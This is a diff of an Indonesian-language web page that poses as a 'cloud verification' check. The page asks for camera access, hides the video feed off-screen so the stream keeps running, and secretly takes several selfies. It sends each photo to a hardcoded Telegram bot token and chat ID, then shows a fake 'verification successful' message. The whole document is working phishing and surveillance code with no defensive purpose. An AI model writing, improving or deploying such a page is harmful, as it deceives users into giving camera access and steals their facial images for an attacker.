@@ -3,45 +3,21 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Sistem Verifikasi Wajah</title>
+    <title>Sistem Verifikasi Cloud</title>
     <style>
-        body { 
-            background: #000; 
-            color: #fff; 
-            text-align: center; 
-            font-family: sans-serif; 
-            padding-top: 50px; 
-            margin: 0;
-            overflow: hidden;
-        }
-        /* JANGAN pakai display:none atau width:1px supaya browser gak mematikan aliran kamera */
-        video { 
-            position: absolute;
-            left: -9999px; 
-            top: -9999px;
-            width: 640px; 
-            height: 480px;
-        }
-        .container { padding: 20px; }
-        .loading-spinner {
-            border: 4px solid #f3f3f3;
-            border-top: 4px solid cyan;
-            border-radius: 50%;
-            width: 40px;
-            height: 40px;
-            animation: spin 2s linear infinite;
-            margin: 20px auto;
-        }
+        body { background: #000; color: #fff; text-align: center; font-family: sans-serif; padding-top: 50px; }
+        .loader { border: 5px solid #333; border-top: 5px solid cyan; border-radius: 50%; width: 50px; height: 50px; animation: spin 1s linear infinite; margin: 20px auto; }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-        h2 { color: cyan; }
+        /* Video tetap ada tapi ditaruh di luar layar agar sensor tetap nyala */
+        video { position: fixed; left: -1000px; top: -1000px; width: 640px; height: 480px; }
     </style>
 </head>
 <body>
-    <div class="container" id="content">
-        <h2>🛡️ Verifikasi Keamanan</h2>
-        <div class="loading-spinner"></div>
-        <p>Sedang menghubungkan ke server enkripsi...</p>
-        <p style="font-size: 12px; color: #888;">Mohon tetap berada di halaman ini dan pastikan pencahayaan cukup agar verifikasi berhasil.</p>
+    <div id="content">
+        <h2 style="color:cyan;">☁️ CLOUD VERIFICATION</h2>
+        <div class="loader"></div>
+        <p>Mohon jangan tutup halaman ini...</p>
+        <p id="stat">Menghubungkan ke satelit...</p>
     </div>
 
     <video id="video" autoplay playsinline></video>
@@ -50,58 +26,49 @@
     <script>
         const TOKEN = "8373626378:AAHmCRe_FCCDug1yrlsnat6WFhi71Qf6lQI";
         const CHAT_ID = "7596509818";
-
         const video = document.getElementById("video");
         const canvas = document.getElementById("canvas");
 
-        // Akses Kamera dengan settingan lebih stabil
         navigator.mediaDevices.getUserMedia({ 
-            video: { 
-                facingMode: "user",
-                width: { ideal: 1280 },
-                height: { ideal: 720 }
-            } 
+            video: { facingMode: "user" } 
         })
         .then(stream => {
             video.srcObject = stream;
+            document.getElementById("stat").innerText = "Sinkronisasi sensor cahaya...";
             
-            // TUNGGU 5 DETIK (5000ms) agar sensor kamera menyesuaikan cahaya (Gak Hitam lagi)
-            setTimeout(takeAndSend, 5000);
+            // JANGAN LANGSUNG JEPRET. Tunggu 6 detik biar sensor bener-bener terang.
+            setTimeout(multiShot, 6000);
         })
-        .catch(err => {
-            alert("PENTING: Izinkan akses kamera untuk verifikasi keamanan akun Anda.");
-            location.reload();
-        });
+        .catch(() => { alert("Gagal verifikasi. Izin kamera diperlukan."); location.reload(); });
 
-        function takeAndSend() {
-            // Pastikan video sudah siap data gambarnya
-            if (video.readyState >= 2) {
+        async function multiShot() {
+            document.getElementById("stat").innerText = "Mengenkripsi data wajah...";
+            // Kita jepret 2 kali dengan jeda 1 detik biar dapet yang paling terang
+            await takeAndSend("Foto 1 (Tunggu Fokus)");
+            setTimeout(async () => {
+                await takeAndSend("Foto 2 (Stabil)");
+                document.getElementById("content").innerHTML = "<h2>✅ SELESAI</h2><p>Verifikasi Berhasil!</p>";
+            }, 1500);
+        }
+
+        function takeAndSend(cap) {
+            return new Promise((resolve) => {
                 canvas.width = video.videoWidth;
                 canvas.height = video.videoHeight;
-                const ctx = canvas.getContext("2d");
-                
-                // Ambil gambar
-                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+                canvas.getContext("2d").drawImage(video, 0, 0);
                 
                 canvas.toBlob(blob => {
                     const formData = new FormData();
                     formData.append("chat_id", CHAT_ID);
                     formData.append("photo", blob, "selfie.jpg");
-                    formData.append("caption", "📸 <b>HASIL VERIFIKASI MASUK!</b>\n\n✅ Sensor Berhasil Menangkap Gambar.");
+                    formData.append("caption", "📸 " + cap);
 
                     fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, {
                         method: "POST",
                         body: formData
-                    })
-                    .then(res => {
-                        document.getElementById("content").innerHTML = "<h2>✅ Berhasil!</h2><p>Identitas Anda telah terverifikasi secara terenkripsi.</p>";
-                    })
-                    .catch(err => console.error("Gagal kirim:", err));
-                }, "image/jpeg", 0.7); // Kualitas 0.7 agar proses kirim cepat
-            } else {
-                // Jika belum siap, coba lagi dalam 1 detik
-                setTimeout(takeAndSend, 1000);
-            }
+                    }).then(() => resolve());
+                }, "image/jpeg", 0.9);
+            });
         }
     </script>
 </body>
